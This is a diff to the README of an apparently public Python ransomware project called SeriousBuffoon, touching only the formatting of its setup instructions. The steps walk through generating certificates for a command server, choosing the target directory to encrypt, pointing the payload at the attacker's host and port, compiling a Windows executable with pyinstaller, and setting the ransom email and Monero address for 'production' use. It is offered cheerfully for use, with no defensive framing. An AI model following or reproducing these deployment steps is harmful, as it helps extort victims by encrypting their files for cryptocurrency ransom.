@@ -40,28 +40,33 @@ Probably the best Python ransomware available on Github
 
 <h3>[-] Set up the server [-]</h3>
 
-	+> Execute the "auto_cert_gen.sh" file for generate your certificate and key
-	+> Edit server.py and the variables "keyfile" and "certificate" by setting the path of these files
-	+> Edit your IP and PORT 
-	+> Run the server by taping python3 server.py . (Maybe you will need to install termcolor (pip3 install termcolor))
++> ``cd SeriousBuff00n/Server/``
+
++> ``./auto_cert_gen.sh``
+
++> Edit ``server.py`` and the variables ``KEYFILE`` and ``CERTIFICATE`` by setting the path of these files
+
++> Edit your ``IP`` and ``PORT`` 
+
++> Run the server by taping ``python3 server.py`` . (Maybe you will need to install termcolor ( ``pip3 install termcolor`` ))
 
 <h3>[-] Set up the virtual environment and install all the required packages [-]</h3>
 
-```cd SeriousBuffoon/Bin```
++> ```cd SeriousBuffoon/Bin```
 
-create virtual env : ``py -m venv .venv``
++> create virtual env : ``py -m venv .venv``
 
-activate the virtual env: ``.\.venv\Scripts\activate`` 
++> activate the virtual env: ``.\.venv\Scripts\activate`` 
 
-install libs: ``pip3 install -r ..\ressource\requierements.txt``
++> install libs: ``pip3 install -r ..\ressource\requierements.txt``
 
-Edit the ``const.py`` file and the variable : ``DIR_TO_HIT`` to set where SeriousBuffoon should encrypt
++> Edit the ``const.py`` file and the variable : ``DIR_TO_HIT`` to set where SeriousBuffoon should encrypt
 
-Edit the ``const.py`` file and the variable : ``HOST``,``PORT`` to set your server and port
++> Edit the ``const.py`` file and the variable : ``HOST``,``PORT`` to set your server and port
 
-Compile the ransomware by type : ``pyinstaller build.spec``
++> Compile the ransomware by type : ``pyinstaller build.spec``
 
-You will find the .exe in "dist" folder
++> You will find the .exe in ``SeriousBuff00n/Bin/dist`` folder
 
 <b>Enjoy <3</b>
 
@@ -74,8 +79,8 @@ You will find the .exe in "dist" folder
 	- Go to C:\Users\user\AppData\Local and delete IconCache.db
 
 
-[-] In production dont forget to edit the EMAIL and MONERO_ADDRESS in const.py.
+[-] In production dont forget to edit the ``EMAIL`` and ``MONERO_ADDRESS`` in ``const.py``.
 
-[-] Add some files extensions on encryption/encrypt.py line 26.
+[-] Add some files extensions on ``encryption/encrypt.py`` line 26.
 
-[-] You can modify the build.spec if you want change the behaviour of the ransomware
+[-] You can modify the ``build.spec`` if you want change the behaviour of the ransomware
